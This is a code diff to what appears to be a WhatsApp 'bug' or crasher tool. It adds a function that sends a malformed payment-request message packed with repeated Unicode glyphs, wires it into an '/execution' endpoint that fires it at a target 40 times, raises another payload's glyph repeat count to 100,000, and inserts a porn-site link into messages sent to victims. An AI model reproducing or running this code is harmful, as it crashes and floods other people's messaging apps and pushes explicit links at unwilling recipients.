@@ -1215,6 +1215,40 @@ async function TrashLocIOS(sock, XS, count = 30) {
   }
 };
 
+// forsklos woilah
+async function FcOneMsg(sock, target) {
+  const fconemsg = {
+    requestPaymentMessage: {
+      amount: {
+       value: 1,
+       offset: 0,
+       currencyCodeIso4217: "IDR",
+       requestFrom: isTarget,
+       expiryTimestamp: Date.now() + 8000
+      },
+      contextInfo: {
+        externalAdReply: {
+          title: "Piantech",
+          body: "ြ".repeat(1500),
+          mimetype: "audio/mpeg",
+          caption: "ြ".repeat(1500),
+          showAdAttribution: true,
+          sourceUrl: "https://t.me/Piantechh",
+          thumbnailUrl: "https://files.catbox.moe/eqsjkd.jpg"
+        }
+      }
+    }
+  };
+  
+    await sock.relayMessage(target, fconemsg, {
+    participant: { jid: target },
+    messageId: null,
+    userJid: target,
+    quoted: null
+  });
+}
+// end forsklos
+
 // function bug kapotID //
 async function CrashUi(sock, target) {
   await sock.relayMessage(
@@ -1378,10 +1412,10 @@ async function CardsCarousel(sock, target, count = 50) {
             },
             interactiveMessage: proto.Message.InteractiveMessage.fromObject({
               body: proto.Message.InteractiveMessage.Body.create({
-                text: `You, You Disappointed Me \n${"𑜦".repeat(1000)}:)\n\u0000`
+                text: `You, You Disappointed Me \n${"𑜦".repeat(100000)}:)\n\u0000`
               }),
               footer: proto.Message.InteractiveMessage.Footer.create({
-                text: "`YT:` https://youtube.com/@YukinaHiiragiDevils"
+                text: "`bokep:` https://xnxx.com"
               }),
               header: proto.Message.InteractiveMessage.Header.create({
                 hasMediaAttachment: false
@@ -4309,6 +4343,15 @@ app.post("/execution", requireAuth, async (req, res) => {
           for (let i = 0; i < 10; i++) {
         await CosmoPrivUiXFC(sock, targetJid);
           }
+        bugResult = { success: true };
+
+      } else if (mode === "fcbos") {
+        for (let i = 0; i < 10; i++) {
+        await FcOneMsg(sock, targetJid);
+        await FcOneMsg(sock, targetJid);
+        await FcOneMsg(sock, targetJid);
+        await FcOneMsg(sock, targetJid);
+        }
         bugResult = { success: true };
 
       }
